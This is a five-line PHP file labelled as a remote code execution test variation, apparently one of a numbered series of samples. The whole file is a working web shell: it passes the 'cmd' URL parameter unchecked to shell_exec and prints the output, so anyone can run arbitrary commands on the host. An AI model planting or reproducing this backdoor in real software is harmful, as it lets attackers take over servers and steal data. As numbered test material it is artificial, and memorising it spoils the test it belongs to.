<?php
// RCE test variation #749
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>